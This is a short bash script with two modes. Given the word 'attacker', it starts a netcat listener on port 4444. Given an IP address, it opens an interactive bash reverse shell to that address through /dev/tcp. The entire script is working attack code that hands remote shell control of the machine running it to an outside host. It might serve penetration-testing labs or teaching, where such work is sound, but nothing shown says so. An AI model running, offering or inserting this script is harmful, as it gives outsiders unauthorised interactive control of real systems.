#!/usr/bin/env bash
set -e

if [ -z "$1" ]; then
  echo "Usage: $0 <attacker-ip>"
  exit 1
fi

if [[ $1 = 'attacker' ]]; then
  echo "starting listener on port 4444"
  set -x
  nc -lvp 4444
else
  echo "running reverse shell to $1"
  set -x
  /bin/bash -i >& "/dev/tcp/$1/4444" 0>&1
fi
